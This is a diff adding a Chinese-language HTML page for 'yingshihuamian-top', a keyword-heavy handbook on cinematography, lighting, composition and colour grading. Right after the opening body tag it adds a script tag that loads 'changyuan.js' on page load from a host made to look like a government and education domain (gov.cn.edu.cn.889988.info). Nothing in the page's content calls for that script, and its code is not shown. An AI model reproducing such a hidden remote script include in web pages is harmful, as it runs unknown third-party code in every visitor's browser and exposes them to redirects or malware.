@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="index, follow">
+<meta name="author" content="影视画面">
+<meta name="rating" content="general">
+<meta name="description" content="影视画面（yingshihuamian-top）是一处围绕影视画面展开的内容手册：从构图、光影、色彩、运镜、场景美术到后期调色，逐帧拆解电影与剧集中的画面语言。访问 https://yingshihuamian-top.github.io 可阅读画面分析、导演风格对比、镜头术语释义与视觉参考索引，适合影像创作者、影视专业学生和影迷日常查阅。">
+<meta name="keywords" content="影视画面, yingshihuamian-top, 镜头语言, 电影构图, 光影分析, 调色参考, 场景美术, 运镜技巧, 导演视觉风格, 剧集画面解析">
+<title>影视画面 yingshihuamian-top｜镜头语言、光影构图与调色参考手册</title>
+<style>
+:root{--paper:#f4f1ea;--paper2:#ebe6da;--ink:#23201c;--ink2:#5e584e;--accent:#b4482c;--accent2:#2f6b63;--line:#d8d2c4;--line2:#c9c2b1}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--paper);color:var(--ink);font-family:"Songti SC","SimSun","Source Han Serif SC",Georgia,serif;font-size:16px;line-height:1.85}
+img{max-width:100%;display:block}
+a{color:var(--accent);text-decoration:none}
+.wrap{width:min(1080px,92vw);margin:0 auto}
+.masthead{border-bottom:3px double var(--line2);padding:34px 0 18px}
+.mast-top{display:flex;justify-content:space-between;align-items:flex-end;gap:20px;flex-wrap:wrap}
+.issue{font-size:12px;letter-spacing:2px;color:var(--ink2);text-transform:uppercase}
+.issue b{color:var(--accent)}
+.masthead h1{font-size:clamp(34px,7vw,64px);margin:14px 0 6px;letter-spacing:4px;font-weight:700;text-align:center}
+.masthead .sub{text-align:center;color:var(--ink2);font-size:14px;letter-spacing:3px}
+.masthead .url-line{text-align:center;margin-top:14px;font-size:13px;color:var(--ink2);font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.masthead .url-line code{background:var(--paper2);border:1px solid var(--line);padding:3px 10px;border-radius:4px;color:var(--accent);letter-spacing:.5px}
+.tabs{display:flex;flex-wrap:wrap;gap:0;border-top:1px solid var(--line2);border-bottom:1px solid var(--line2);margin-top:22px}
+.tabs a{flex:1 1 auto;text-align:center;padding:11px 6px;font-size:14px;color:var(--ink2);border-right:1px solid var(--line);font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.tabs a:last-child{border-right:none}
+.tabs a:hover{background:var(--paper2);color:var(--accent)}
+.lead{display:grid;grid-template-columns:1fr 220px;gap:30px;padding:38px 0 26px;border-bottom:1px solid var(--line)}
+.lead p{margin:0 0 14px;font-size:17px;text-align:justify}
+.lead p:first-of-type:first-letter{font-size:44px;float:left;line-height:.9;margin:6px 8px 0 0;color:var(--accent);font-weight:700}
+.aside-note{border:1px solid var(--line2);background:var(--paper2);padding:16px;font-size:13px;color:var(--ink2);font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.aside-note strong{display:block;color:var(--ink);margin-bottom:6px;font-size:14px}
+.part{margin-top:46px}
+.part > h2{font-size:23px;margin:0 0 18px;padding-left:14px;border-left:7px solid var(--accent);letter-spacing:1px}
+.part > h2 small{display:block;font-size:12px;color:var(--ink2);letter-spacing:2px;font-weight:400;margin-top:3px}
+.strips{display:grid;grid-template-columns:repeat(2,1fr);gap:0;border:1px solid var(--line2)}
+.strip{padding:20px 22px;border-bottom:1px solid var(--line2);border-right:1px solid var(--line2)}
+.strip:nth-child(2n){border-right:none}
+.strip:nth-child(n+3){border-bottom:none}
+.strip .no{font:italic 15px Georgia,serif;color:var(--accent2);margin-bottom:5px}
+.strip h3{margin:0 0 8px;font-size:18px}
+.strip p{margin:0;font-size:14px;color:var(--ink2)}
+.strip ul{margin:10px 0 0;padding-left:18px;font-size:14px;color:var(--ink2)}
+.strip ul li{margin-bottom:4px}
+.table-wrap{overflow-x:auto;border:1px solid var(--line2);background:#faf8f2}
+table{width:100%;border-collapse:collapse;font-size:14px;font-family:"PingFang SC","Microsoft YaHei",sans-serif;min-width:620px}
+th,td{padding:12px 14px;text-align:left;border-bottom:1px solid var(--line)}
+th{background:var(--paper2);color:var(--ink);letter-spacing:1px}
+td:first-child{color:var(--accent);font-weight:600}
+tr:last-child td{border-bottom:none}
+.quote-block{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.quote{border-top:2px solid var(--ink);padding-top:14px;font-size:14px;color:var(--ink2)}
+.quote cite{display:block;margin-top:10px;font-style:normal;color:var(--accent2);font-size:13px}
+.gallery{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.frame{aspect-ratio:4/3;background:linear-gradient(150deg,var(--paper2),#ddd6c6);border:1px solid var(--line2);display:flex;align-items:center;justify-content:center;text-align:center;padding:10px;font-size:13px;color:#8b8475;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.frame b{display:block;color:var(--ink);font-size:14px;margin-bottom:5px}
+.post{display:grid;grid-template-columns:90px 1fr;gap:18px;padding:18px 0;border-bottom:1px dashed var(--line2)}
+.post:last-child{border-bottom:none}
+.post .day{font-size:13px;color:var(--accent);font-family:"PingFang SC",sans-serif;line-height:1.5}
+.post .day b{display:block;font-size:26px;color:var(--ink)}
+.post h4{margin:0 0 6px;font-size:17px}
+.post p{margin:0;font-size:14px;color:var(--ink2)}
+.foot{border-top:3px double var(--line2);margin-top:50px;padding:30px 0 40px;font-size:13px;color:var(--ink2);font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.foot-top{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.foot-nav a{margin-left:14px;color:var(--ink2)}
+.foot-nav a:hover{color:var(--accent)}
+.foot-bottom{margin-top:16px;padding-top:16px;border-top:1px solid var(--line);word-break:break-all}
+@media (max-width:820px){
+ .lead{grid-template-columns:1fr}
+ .quote-block,.gallery{grid-template-columns:repeat(2,1fr)}
+ .strip:nth-child(2n){border-right:none}
+ .strip:nth-child(3){border-bottom:1px solid var(--line2)}
+ .strips{grid-template-columns:1fr}
+ .strip{border-right:none}
+ .strip:nth-child(n+3){border-bottom:1px solid var(--line2)}
+ .strip:last-child{border-bottom:none}
+}
+@media (max-width:520px){
+ .masthead h1{letter-spacing:2px}
+ .tabs a{flex:1 1 50%;border-bottom:1px solid var(--line)}
+ .tabs a:nth-child(2n){border-right:none}
+ .quote-block,.gallery{grid-template-columns:1fr}
+ .post{grid-template-columns:1fr;gap:8px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="wrap">
+
+<header class="masthead">
+ <div class="mast-top">
+  <div class="issue">影视画面 · 视觉语言专栏 <b>VOL.2026</b></div>
+  <div class="issue">影像研究 / 画面拆解 / 调色参考</div>
+ </div>
+ <h1>影视画面</h1>
+ <div class="sub">yingshihuamian-top · 镜头 · 光影 · 构图 · 调色</div>
+ <div class="url-line">官方站点：<code>https://yingshihuamian-top.github.io</code></div>
+ <nav class="tabs" aria-label="栏目导航">
+  <a href="#grammar">画面语法</a>
+  <a href="#directors">导演视觉</a>
+  <a href="#glossary">术语表</a>
+  <a href="#frames">画面索引</a>
+  <a href="#notes">编辑手记</a>
+ </nav>
+</header>
+
+<section class="lead">
+ <div>
+  <p>影视画面所关心的，不是一段剧情讲了什么，而是它<em>怎样被看见</em>。同一个空间，换一种焦段、一盏光的落点、一次色彩的偏移，叙事的分量就会不同。本手册以 yingshihuamian-top 为内容主体，把电影与剧集中的画面拆成可辨认的元素，供反复对照与临摹。</p>
+  <p>从构图的比例关系到镜头的运动轨迹，从场景美术的材质到后期调色的色域，每一条条目都尽量指向具体的视觉手段，而非笼统的观感。读者可以在阅读后回看原片，验证这些手段是否真的生效。</p>
+ </div>
+ <aside class="aside-note">
+  <strong>如何使用本页</strong>
+  顶部五个栏目分别对应画面语法、导演视觉风格、镜头术语释义、画面参考索引与编辑手记。点击栏目名即可跳转到对应板块，无需离开页面。
+  <br><br>
+  网址：<code style="color:var(--accent)">https://yingshihuamian-top.github.io</code>
+ </aside>
+</section>
+
+<section id="grammar" class="part">
+ <h2>画面语法<small>FRAMEWORK · 五个可拆解的视觉维度</small></h2>
+ <div class="strips">
+  <article class="strip">
+   <div class="no">01</div>
+   <h3>构图与画幅</h3>
+   <p>三分法、中心对称、留白与框架构图如何分配观众的视线，以及 2.39:1 与 1.85:1 画幅对空间表达的影响。</p>
+   <ul><li>主体位置与视线方向</li><li>前景遮挡与纵深层次</li></ul>
+  </article>
+  <article class="strip">
+   <div class="no">02</div>
+   <h3>光线的质地</h3>
+   <p>硬光与柔光的边缘差异，主光、辅光、轮廓光的布置逻辑，以及如何用光区划分角色的心理状态。</p>
+   <ul><li>顺光、侧光、逆光</li><li>窗口光与自然光模拟</li></ul>
+  </article>
+  <article class="strip">
+   <div class="no">03</div>
+   <h3>色彩与调色</h3>
+   <p>色温、互补色、饱和度层级在场景中的运用，以及不同调色风格对时代感与情绪的定义方式。</p>
+   <ul><li>色彩脚本与场景配色</li><li>高调与低调影像</li></ul>
+  </article>
+  <article class="strip">
+   <div class="no">04</div>
+   <h3>镜头运动</h3>
+   <p>固定、推拉、摇移、跟拍与手持的叙事功能，运动速度与被摄体节奏之间的配合关系。</p>
+   <ul><li>轨道与稳定器</li><li>长镜头的空间调度</li></ul>
+  </article>
+  <article class="strip">
+   <div class="no">05</div>
+   <h3>场景与美术</h3>
+   <p>布景、道具、材质与服装如何共同构成画面的信息层，使一个镜头在静止时仍可读。</p>
+   <ul><li>空间层次与动线</li><li>时代质感与细节密度</li></ul>
+  </article>
+  <article class="strip">
+   <div class="no">06</div>
+   <h3>剪辑与视线</h3>
+   <p>轴线规则、视线匹配与镜头组接方式，如何决定观众对空间关系的理解。</p>
+   <ul><li>匹配剪辑与跳切</li><li>节奏与画面停留时长</li></ul>
+  </article>
+ </div>
+</section>
+
+<section id="directors" class="part">
+ <h2>导演视觉<small>STYLE FILE · 视觉风格的横向比较</small></h2>
+ <div class="table-wrap">
+  <table>
+   <thead>
+    <tr><th>视觉特征</th><th>常用画面手段</th><th>可观察的重点</th><th>适用题材</th></tr>
+   </thead>
+   <tbody>
+    <tr><td>深焦构图</td><td>大景深、前后景同时清晰</td><td>前景人物与背景事件的并置</td><td>群像、社会题材</td></tr>
+    <tr><td>高对比布光</td><td>硬光、大面积暗部</td><td>光区边界与面部明暗比例</td><td>悬疑、黑色电影</td></tr>
+    <tr><td>长镜头调度</td><td>连续运动、场景内走位</td><td>空间完整性与时间真实感</td><td>纪实、史诗</td></tr>
+    <tr><td>低饱和调色</td><td>削弱色彩、提高质感</td><td>材质纹理与灰阶层次</td><td>历史、战争</td></tr>
+    <tr><td>几何构图</td><td>对称、重复线条</td><td>建筑线条对人物的压迫</td><td>科幻、寓言</td></tr>
+    <tr><td>手持纪实</td><td>轻微晃动、近距跟拍</td><td>呼吸感与临场距离</td><td>灾难、生活流</td></tr>
+   </tbody>
+  </table>
+ </div>
+ <div class="quote-block" style="margin-top:24px">
+  <div class="quote">构图不是把东西摆好看，而是决定观众先看哪里、后看哪里。<cite>—— 画面观察笔记</cite></div>
+  <div class="quote">光的落点一旦改变，角色与场景的关系就跟着改变。</div>
+  <div class="quote">调色是最后一层布光，它决定了整个影像的温度。</div>
+ </div>
+</section>
+
+<section id="glossary" class="part">
+ <h2>术语表<small>GLOSSARY · 镜头语言的常用表述</small></h2>
+ <div class="strips">
+  <article class="strip">
+   <div class="no">A</div>
+   <h3>景别与焦段</h3>
+   <p>远景、全景、中景、近景、特写的表意差异；广角、标准、长焦对空间压缩与透视的影响。</p>
+  </article>
+  <article class="strip">
+   <div class="no">B</div>
+   <h3>角度与视点</h3>
+   <p>平视、俯视、仰视以及主观镜头对权力关系与代入感的作用。</p>
+  </article>
+  <article class="strip">
+   <div class="no">C</div>
+   <h3>光线术语</h3>
+   <p>伦勃朗光、蝴蝶光、轮廓光、底光各自形成的面部形态与情绪指向。</p>
+  </article>
+  <article class="strip">
+   <div class="no">D</div>
+   <h3>色彩术语</h3>
+   <p>色相、明度、饱和度，以及色彩和谐与色彩冲突的基本组合方式。</p>
+  </article>
+ </div>
+</section>
+
+<section id="frames" class="part">
+ <h2>画面索引<small>INDEX · 按视觉元素分类的参考图位</small></h2>
+ <div class="gallery">
+  <div class="frame"><b>构图</b>对称 / 三分 / 留白</div>
+  <div class="frame"><b>光线</b>顺光 / 侧光 / 逆光</div>
+  <div class="frame"><b>色彩</b>冷暖 / 互补 / 单色</div>
+  <div class="frame"><b>运动</b>推拉 / 摇移 / 跟拍</div>
+  <div class="frame"><b>景别</b>远景 → 特写</div>
+  <div class="frame"><b>焦段</b>广角 / 标准 / 长焦</div>
+  <div class="frame"><b>材质</b>木 / 石 / 金属 / 织物</div>
+  <div class="frame"><b>氛围</b>高调 / 低调 / 中间调</div>
+ </div>
+ <p style="margin-top:18px;font-size:14px;color:var(--ink2)">影视画面 yingshihuamian-top 的画面索引以分类标签方式组织，便于按某一元素集中查阅。完整索引随内容更新逐步扩充，访问 <code style="color:var(--accent)">https://yingshihuamian-top.github.io</code> 可查看最新状态。</p>
+</section>
+
+<section id="notes" class="part">
+ <h2>编辑手记<small>NOTES · 内容与更新记录</small></h2>
+ <div class="post">
+  <div class="day"><b>10</b>月 21 日</div>
+  <div><h4>新增「画面语法」六项维度</h4><p>把构图、光线、色彩、运动、美术、剪辑拆成独立条目，并补充每项的可观察要点，方便回看原片时逐条核对。</p></div>
+ </div>
+ <div class="post">
+  <div class="day"><b>10</b>月 14 日</div>
+  <div><h4>导演视觉风格对比表上线</h4><p>以视觉特征而非作品名单作为分类依据，列出六种常见风格的画面手段与适用题材，避免写成导演名单罗列。</p></div>
+ </div>
+ <div class="post">
+  <div class="day"><b>09</b>月 30 日</div>
+  <div><h4>术语表首版发布</h4><p>收录景别、角度、光线与色彩四类基础术语，用语尽量贴近实际拍摄现场的表达习惯。</p></div>
+ </div>
+ <div class="post">
+  <div class="day"><b>09</b>月 18 日</div>
+  <div><h4>影视画面手册开始连载</h4><p>确定以「怎样被看见」为主线，聚焦画面语言本身，而非剧情评价与演员动态。</p></div>
+ </div>
+</section>
+
+<footer class="foot">
+ <div class="foot-top">
+  <div>© <span id="y">2026</span> 影视画面 · yingshihuamian-top　影像画面语言手册</div>
+  <div class="foot-nav">
+   <a href="#grammar">画面语法</a>
+   <a href="#directors">导演视觉</a>
+   <a href="#glossary">术语表</a>
+   <a href="#frames">画面索引</a>
+  </div>
+ </div>
+ <div class="foot-bottom">
+  官方网址：https://yingshihuamian-top.github.io　本站内容以影视画面分析、镜头语言与视觉参考为主，所涉及的影视作品版权归各自权利人所有。
+ </div>
+</footer>
+
+</div>
+<script>
+document.getElementById('y').textContent=String(new Date().getFullYear());
+</script>
+</body>
+</html>
